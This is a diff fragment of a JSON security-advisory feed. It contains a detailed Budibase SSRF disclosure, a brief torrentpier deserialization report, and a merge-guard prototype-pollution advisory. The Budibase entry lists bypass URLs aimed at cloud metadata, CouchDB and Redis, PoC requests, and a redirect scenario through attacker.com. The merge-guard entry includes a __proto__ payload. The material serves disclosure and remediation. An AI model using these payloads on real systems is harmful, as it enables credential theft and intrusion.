+      "description": "## 1. Summary\n\n| Field | Value |\n|-------|-------|\n| **Title** | SSRF via trivial `.tar.gz` substring bypass in Plugin URL upload |\n| **Product** | Budibase (Self-Hosted) |\n| **Version** | \u2264 3.34.11 (latest stable as of 2026-03-30) |\n| **Component** | `packages/server/src/api/controllers/plugin/url.ts` |\n| **Vulnerability Type** | CWE-918: Server-Side Request Forgery (SSRF), CWE-184: Incomplete List of Disallowed Inputs |\n| **Severity** | High (chained) / Medium (standalone) |\n| **CVSS 3.1 Score (chained)** | 7.7 \u2014 `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |\n| **CVSS 3.1 Score (standalone)** | 5.4 \u2014 `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` |\n| **Attack Vector** | Network |\n| **Privileges Required** | Low (Global Builder role) |\n| **User Interaction** | None |\n| **Affected Deployments** | All Budibase instances with plugin loading enabled (default) |\n\n---\n\n## 2. Description\n\nThe Plugin URL upload endpoint (`POST /api/plugin`) validates the submitted URL with a single substring check: `url.includes(\".tar.gz\")`. Any URL containing `.tar.gz` anywhere in the string \u2014 in the path, query string, or fragment \u2014 passes this check. The URL then proceeds directly to `fetchWithBlacklist()` with no further validation of host, scheme, or path.\n\nStandalone, this vulnerability is blocked by Budibase's default SSRF blacklist, which covers private IP ranges. But the URL validation layer itself is broken regardless, and it directly enables SSRF in two realistic situations: (1) when chained with the `BLACKLIST_IPS` bypass ([001]), where the blacklist is empty; and (2) when the plugin server follows HTTP redirects from an external URL to an internal target (the default `node-fetch` behavior with `redirect: 'follow'`).\n\nThe developer team's own test suite (`objectStore.spec.ts:393`) tests that `downloadTarballDirect` passes through `fetchWithBlacklist` \u2014 confirming they're aware of the SSRF risk on this path. The `.tar.gz` substring check as the only URL-level guard was never intended to be the security boundary, but in practice it is.\n\n---\n\n## 3. Root Cause Analysis\n\n### 3.1 Trivial substring-based URL validation\n\n**File**: `packages/server/src/api/controllers/plugin/url.ts`\n\n```typescript\n// Lines 7-19\nexport async function urlUpload(url: string, name = \"\", headers = {}) {\n  if (!url.includes(\".tar.gz\")) {\n    // \u2190 ONLY validation: any URL with \".tar.gz\" anywhere passes\n    throw new Error(\"Plugin must be compressed into a gzipped tarball.\")\n  }\n\n  const path = await downloadUnzipTarball(url, name, headers)\n  // \u2191 url is passed directly \u2014 no host allowlist, no scheme check, no path normalization\n  try {\n    return await getPluginMetadata(path)\n  } catch (err) {\n    deleteFolderFileSystem(path)\n    throw err\n  }\n}\n```\n\n**Problem**: `url.includes(\".tar.gz\")` checks for a substring anywhere in the full URL string. It does not validate hostname, scheme, or that `.tar.gz` appears as an actual file extension at the end of the path.\n\n### 3.2 Bypass examples\n\n| Attack URL | `includes(\".tar.gz\")` | Actual request target |\n|------------|----------------------|----------------------|\n| `http://169.254.169.254/.tar.gz` | \u2705 passes | AWS IMDS |\n| `http://127.0.0.1:4005/_session.tar.gz` | \u2705 passes | CouchDB |\n| `http://10.0.0.1:6379/.tar.gz` | \u2705 passes | Redis |\n| `http://attacker.com/file.tar.gz?x=http://internal/` | \u2705 passes | Redirect to internal |\n| `http://internal-host/.tar.gz#fragment` | \u2705 passes | Internal service |\n\n### 3.3 Developer awareness of SSRF risk on this path\n\n**File**: `packages/backend-core/src/objectStore/tests/objectStore.spec.ts`\n\n```typescript\n// Line 393\nit(\"uses fetchWithBlacklist in downloadTarballDirect\", async () => {\n  downloadTarballDirect(\"http://169.254.169.254/metadata/v1/\", \"tmp\")\n  // \u2190 team explicitly tests that IMDS is blocked via blacklist\n})\n```\n\nThe team knows this code path can reach IMDS. They rely on `fetchWithBlacklist` as the defense \u2014 but never tested the `.tar.gz` substring bypass that trivially routes around it at the URL validation layer.\n\n### 3.4 Authorization model\n\n| Operation | Endpoint | Required Permission |\n|-----------|----------|---------------------|\n| Plugin URL upload | `POST /api/plugin` | Global Builder |\n\n**Key insight**: The plugin endpoint is behind `globalBuilderRoutes`, which requires Global Builder permission. This is a low-privilege role routinely granted to developers on self-hosted instances.\n\n---\n\n## 4. Impact Analysis\n\n### 4.1 Confidentiality \u2014 High (chained) / Low (standalone)\n\nWhen chained with [001] (`BLACKLIST_IPS` bypass):\n- **AWS/GCP/Azure IMDS** (`169.254.169.254`) \u2014 IAM credentials, service account tokens\n- **CouchDB** (`127.0.0.1:4005`) \u2014 application databases, user records\n- **Redis** (`127.0.0.1:6379`) \u2014 session tokens\n- **Internal network services** (`172.16.0.0/12`, `10.0.0.0/8`)\n\nStandalone (with default blacklist active):\n- **Open redirect chains** \u2014 if the plugin server follows redirects from external URLs to internal IPs, the blacklist check on the original URL does not protect against the redirected destination. This depends on `node-fetch` redirect behavior and whether `fetchWithBlacklist` re-checks the redirected URL.\n\n### 4.2 Integrity \u2014 None (GET-only path)\n\nThe plugin URL upload uses GET-only semantics via `fetchWithBlacklist`. No write operations to internal services via this path.\n\n### 4.3 Availability \u2014 None\n\nNo service disruption.\n\n### 4.4 Scope Change (chained)\n\nSame as [001]: crosses application \u2192 infrastructure boundary when combined with the blacklist bypass.\n\n---\n\n## 5. Proof of Concept\n\n> **Verification status**: Code-level confirmed. End-to-end Docker test pending.\n> PoC files are ready: `poc/004_plugin_url_ssrf/poc_004_plugin_url_ssrf.py` + `docker-compose.yml`\n\n### 5.1 Environment Setup\n\n```bash\n# poc/004_plugin_url_ssrf/docker-compose.yml\nservices:\n  budibase:\n    image: budibase/budibase:latest\n    environment:\n      SELF_HOSTED: \"1\"\n      BLACKLIST_IPS: \"\"          # \u2190 enables chained SSRF (001)\n      JWT_SECRET: \"poc_jwt_secret\"\n      BB_ADMIN_USER_EMAIL: \"poc@budibase.com\"\n      BB_ADMIN_USER_PASSWORD: \"pocPassword123!\"\n    ports: [\"10000:10000\"]\n\n  victim:\n    image: python:3.11-alpine\n    command: python -m http.server 8888\n```\n\n```bash\ncd poc/004_plugin_url_ssrf\ndocker-compose up -d\npython3 poc_004_plugin_url_ssrf.py --target http://localhost:10000\n```\n\n### 5.2 Step 1 \u2014 Bypass the `.tar.gz` check with a crafted URL\n\n```http\nPOST /api/plugin HTTP/1.1\nHost: localhost:10000\nCookie: budibase:auth=<builder-session-cookie>\nContent-Type: application/json\n\n{\n  \"source\": \"URL\",\n  \"url\": \"http://victim:8888/.tar.gz\",\n  \"name\": \"poc-test\"\n}\n```\n\nThe `url.includes(\".tar.gz\")` check passes because `.tar.gz` appears in the path. The URL `http://victim:8888/.tar.gz` is not a valid tarball \u2014 but the string check doesn't know that.\n\n### 5.3 Step 2 \u2014 Expected response (SSRF confirmed)\n\n**With blacklist active (default config):**\n```json\n{ \"message\": \"Failed to import plugin: URL is blocked or could not be resolved safely.\" }\n```\n\n**With `BLACKLIST_IPS=\"\"` (chained with 001):**\n```json\n{ \"message\": \"Failed to import plugin: incorrect header check\" }\n```\n\nThe `\"incorrect header check\"` error (zlib decompressor receiving HTTP response headers) proves the request reached `victim:8888`. The `.tar.gz` substring check was bypassed, and the HTTP fetch completed.\n\n### 5.4 Additional bypass payloads tested (code-level only)\n\n| URL | Check bypass | Intended target |\n|-----|-------------|-----------------|\n| `http://169.254.169.254/.tar.gz` | \u2705 | AWS IMDS |\n| `http://127.0.0.1:4005/_session.tar.gz` | \u2705 | CouchDB |\n| `http://127.0.0.1:6379/.tar.gz` | \u2705 | Redis |\n| `http://attacker.com/real.tar.gz` (redirects to `http://10.0.0.1/`) | \u2705 | Internal via redirect |\n\n---\n\n## 6. Attack Scenarios\n\n### Scenario A \u2014 Chained with [001]: AWS IMDS credential theft\n\n```\n1. Self-hosted deployment has BLACKLIST_IPS set to any value (see report 001)\n2. Builder user sends:\n   POST /api/plugin { \"source\": \"URL\", \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name.tar.gz\" }\n3. Budibase fetches IMDS endpoint \u2192 receives IAM credentials JSON\n4. zlib decompressor fails on non-gzip content \u2192 error response\n5. Depending on logging config, credential material may appear in logs or error details\n```\n\n### Scenario B \u2014 Standalone: Open redirect SSRF (default config)\n\n```\n1. Attacker controls external server: GET /plugin.tar.gz \u2192 302 \u2192 http://192.168.1.1/admin\n2. Builder user submits: POST /api/plugin { \"source\": \"URL\", \"url\": \"http://attacker.com/plugin.tar.gz\" }\n3. node-fetch follows redirect (default: redirect: 'follow')\n4. If fetchWithBlacklist only checks the original URL (not the redirected URL), internal IP is reached\n5. Requires verification of redirect handling in fetchWithBlacklist\n```\n\n### Scenario C \u2014 CouchDB data access (chained)\n\n```\n1. BLACKLIST_IPS=\"\" enables internal access\n2. URL: http://127.0.0.1:4005/_all_dbs.tar.gz\n3. CouchDB responds with JSON list of databases\n4. zlib error confirms HTTP request reached CouchDB\n```\n\n---\n\n## 7. Affected Code Paths\n\n```\nPOST /api/plugin  (Global Builder auth)\n    \u2502\n    \u25bc\npackages/server/src/api/controllers/plugin/index.ts\n    \u2502  source === \"URL\" \u2192 urlUpload(url, name, headers)\n    \u25bc\npackages/server/src/api/controllers/plugin/url.ts:8\n    \u2502  if (!url.includes(\".tar.gz\")) throw   \u2190 ONLY check \u2014 trivially bypassed\n    \u2502  \u2192 \"http://169.254.169.254/.tar.gz\" passes\n    \u25bc\npackages/server/src/utilities/fileSystem/plugins.ts\n    \u2502  downloadUnzipTarball(url, name, headers)\n    \u25bc\npackages/backend-core/src/objectStore/objectStore.ts:703\n    \u2502  downloadTarballDirect(url, path, headers)\n    \u25bc\npackages/backend-core/src/objectStore/utils/outboundFetch.ts\n    \u2502  fetchWithBlacklist(url, options)\n    \u2502  isBlacklisted(hostname)\n    \u2502\n    \u251c\u2500 [default config] \u2192 BlockList has 9 private ranges \u2192 169.254.x BLOCKED \u2713\n    \u2502\n    \u2514\u2500 [BLACKLIST_IPS set, chained with 001] \u2192 empty BlockList \u2192 169.254.x REACHABLE \u2717\n```\n\n---\n\n## 8. Recommended Fixes\n\n### Fix 1 (High): Replace substring check with URL parsing and extension validation\n\n```typescript\n// packages/server/src/api/controllers/plugin/url.ts\n\nimport { URL } from \"url\"\n\nexport async function urlUpload(url: string, name = \"\", headers = {}) {\n  let parsed: URL\n  try {\n    parsed = new URL(url)\n  } catch {\n    throw new Error(\"Invalid plugin URL.\")\n  }\n\n  // Only allow https:// scheme\n  if (parsed.protocol !== \"https:\") {\n    throw new Error(\"Plugin URL must use HTTPS.\")\n  }\n\n  // Require the path to end with .tar.gz (not just contain it anywhere)\n  if (!parsed.pathname.endsWith(\".tar.gz\")) {\n    throw new Error(\"Plugin must be compressed into a gzipped tarball (.tar.gz).\")\n  }\n\n  const path = await downloadUnzipTarball(url, name, headers)\n  // ...\n}\n```\n\n### Fix 2 (High): Re-check blacklist after redirect in `fetchWithBlacklist`\n\n```typescript\n// packages/backend-core/src/objectStore/utils/outboundFetch.ts\n\n// Current: only checks the original URL before fetch\n// Fix: also intercept redirects and re-check each redirect target\n\nconst response = await nodeFetch(url, {\n  ...options,\n  redirect: \"manual\",  // don't auto-follow\n})\n\nif (response.status >= 300 && response.status < 400) {\n  const redirectUrl = response.headers.get(\"location\")\n  if (redirectUrl) {\n    const redirectHost = new URL(redirectUrl).hostname\n    if (await isBlacklisted(redirectHost)) {\n      throw new Error(\"URL is blocked or could not be resolved safely.\")\n    }\n    // recursively fetch (with depth limit)\n  }\n}\n```\n\n### Fix 3 (Medium): Add hostname allowlist option for plugin sources\n\nProvide a `PLUGIN_ALLOWED_HOSTS` variable that restricts plugin URL downloads to explicitly approved domains, rather than relying solely on a blocklist.\n\n---\n\n## 9. References\n\n- **CWE-918**: Server-Side Request Forgery (SSRF) \u2014 https://cwe.mitre.org/data/definitions/918.html\n- **CWE-184**: Incomplete List of Disallowed Inputs \u2014 https://cwe.mitre.org/data/definitions/184.html\n- **OWASP SSRF Prevention Cheat Sheet** \u2014 https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n- **Related finding**: [001] `BLACKLIST_IPS` bypass \u2014 `report/raw/001_ssrf_blacklist_bypass.md`\n- **Developer SSRF awareness test**: `packages/backend-core/src/objectStore/tests/objectStore.spec.ts:393`",
+      "first_seen": "2026-05-11T19:05:16.252395+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252395+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/Budibase/budibase/security/advisories/GHSA-xh5j-727m-w6gg",
+        "https://github.com/advisories/GHSA-xh5j-727m-w6gg"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Budibase vulnerable to SSRF via trivial `.tar.gz` substring bypass in Plugin URL upload (`/api/plugin`)"
+    },
+    {
+      "canonical_id": "GHSA-h29g-c9cx-c73q",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-502"
+      ],
+      "description": "### Summary\nHi, there. We've found PHP Serialize Injections in your project \u201ctorrentpier\". According to the OWASP, it can pose a significant risk: enable an attacker to modify serialized objects in order to inject malicious data into the application code, resulting in code execution or an arbitrary reading of the file on any vulnerable system. \n                                        \n### Details\nIn the attachment you can find a report with the number of vulnerabilities, their types and the vulnerable files. To view the lines of vulnerable code you may scan your project with the \"[PHP Secure](https://phpsecure.net/?utm_source=github&utm_term=torrentpier&utm_content=torrentpier)\" vulnerability scanner with a full access to it.\n\n### PoC\n<img width=\"663\" alt=\"Screenshot 2023-09-25 at 11 12 32 AM\" src=\"https://user-images.githubusercontent.com/118765013/270273991-4a2c3884-3ab0-48ad-af77-3f3dbfa64e2a.png\">\n<img width=\"661\" alt=\"Screenshot 2023-09-25 at 11 12 43 AM\" src=\"https://user-images.githubusercontent.com/118765013/270274006-247ed9d3-2dc0-4a87-8f1f-89079c8be165.png\">\n<img width=\"664\" alt=\"Screenshot 2023-09-25 at 11 12 53 AM\" src=\"https://user-images.githubusercontent.com/118765013/270274018-b99d6ec2-4c5a-439f-b089-9e11345e963d.png\">\n<img width=\"662\" alt=\"Screenshot 2023-09-25 at 11 13 13 AM\" src=\"https://user-images.githubusercontent.com/118765013/270274023-36ecffc7-215d-41db-b3ba-6aa677e644d3.png\">\n\n### About Us\nWe are a team of developers of the PHP Secure vulnerability scanner. First, we checked your code automatically. Then we reviewed the vulnerable code more deeply manually and felt it was necessary to report about it to you. We suggest you scanning your code and address vulnerabilities as soon as possible to prevent a potential breach.\n\nIf you have any questions, email us at support@phpsecure.net\"",
+      "first_seen": "2026-05-11T19:05:16.252256+00:00",
+      "frameworks": [
+        "composer"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252256+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-h29g-c9cx-c73q",
+        "https://github.com/torrentpier/torrentpier/security/advisories/GHSA-h29g-c9cx-c73q"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "torrentpier has PHP Serialize Injections"
+    },
+    {
+      "canonical_id": "GHSA-mhwj-73qx-jqxm",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-1321"
+      ],
+      "description": "## Summary\n\n`@theecryptochad/merge-guard` versions prior to 1.0.1 are vulnerable to Prototype Pollution via the `deepMerge()` function. An attacker who controls the source object can inject `__proto__` keys that mutate `Object.prototype`, affecting all objects in the Node.js runtime.\n\n## Details\n\nThe `deepMerge()` function recursively merges two objects without sanitizing reserved property keys (`__proto__`, `constructor`, `prototype`). When a source object contains a `__proto__` key, its value is assigned to `target.__proto__`, which JavaScript engines interpret as a write to `Object.prototype`.\n\n## Proof of Concept\n\n```js\nconst { deepMerge } = require('@theecryptochad/merge-guard');\nconst payload = JSON.parse('{\"__proto__\":{\"isAdmin\":true}}');\ndeepMerge({}, payload);\nconsole.log({}.isAdmin); // true \u2014 Object.prototype is polluted\n```\n\n## Impact\n\nAny application using `deepMerge()` with untrusted input (e.g. user-supplied JSON from HTTP requests, WebSocket messages, or config files) is vulnerable. An attacker can inject arbitrary properties onto `Object.prototype`, enabling privilege escalation, application logic bypass, and property injection.\n\n## Remediation\n\nUpgrade to `@theecryptochad/merge-guard >= 1.0.1`, which adds an explicit blocklist:\n\n```js\nconst BLOCKED = new Set(['__proto__', 'constructor', 'prototype']);\nif (BLOCKED.has(key)) continue;\n```\n\n## References\n- [CWE-1321: Improper Neutralization of Special Elements in Object Keys](https://cwe.mitre.org/data/definitions/1321.html)\n- [OWASP: Prototype Pollution](https://owasp.org/www-community/attacks/Prototype_Pollution)\n- [Fix commit](https://github.com/TheeCryptoChad/merge-guard/releases/tag/v1.0.1)",
+      "first_seen": "2026-05-11T19:05:16.252774+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252774+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/TheeCryptoChad/merge-guard/commit/25e4b4f2618578a656ef3cb4946a1b475f736736",
+        "https://github.com/TheeCryptoChad/merge-guard/security/advisories/GHSA-mhwj-73qx-jqxm",
+        "https://github.com/advisories/GHSA-mhwj-73qx-jqxm"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "@theecryptochad/merge-guard has Prototype Pollution in its deepMerge() function"
+    }
+  ],
+  "correlated_at": "2026-05-11T19:05:21.600070+00:00"
 }
